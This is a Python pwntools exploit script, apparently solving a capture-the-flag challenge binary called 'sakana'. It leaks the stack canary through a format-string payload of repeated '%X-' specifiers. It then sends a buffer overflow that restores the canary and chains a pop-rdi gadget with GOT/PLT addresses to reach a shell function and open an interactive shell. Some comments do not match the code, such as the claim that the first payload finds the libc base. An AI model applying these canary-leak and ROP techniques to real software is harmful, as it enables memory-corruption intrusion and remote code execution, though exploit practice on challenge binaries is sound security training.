
from pwn import *

import symbol


libc=ELF('pwn/sakana/libc-2.31.so')
elf=context.binary=ELF('pwn/sakana/sakana')
r=process('pwn/sakana/sakana')
output=r.recvuntil(b'~>')
#the 1st payload finds the libc base addresSs
payload=flat([
    b'%X-'*(33+5+1)#33 is the number of words for char 264, and 5 is for the remaining registers. 1 is the canary.
])
#%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-%X-

r.sendline(b'printf')
      

r.sendline(payload)

output=r.recvuntil(b'~>')
print(output)
_canary=output.decode().split('0x')[-1][:16]
print('the canary is: 0x%s'%_canary)
_canary=int(_canary,16)
print('the canary is: 0x%x'%_canary)
#exit(1)

sleep(0.5)

off_set_to_canary=264
pop_rdi=0x00000000000023a3#found in binary by ropper
ret=0x000000000000101a#also found by ropper, for stack alignment
payload=flat([
    off_set_to_canary*b'A',#pad to canary
    _canary, 
    8*b'A',#rbp
    pop_rdi,
    elf.got._start,
    elf.plt._start,
    elf.symbols.shell
])
r.sendline(b'printf')
r.sendline(payload)

print(r.recvall().decode())
r.interactive()

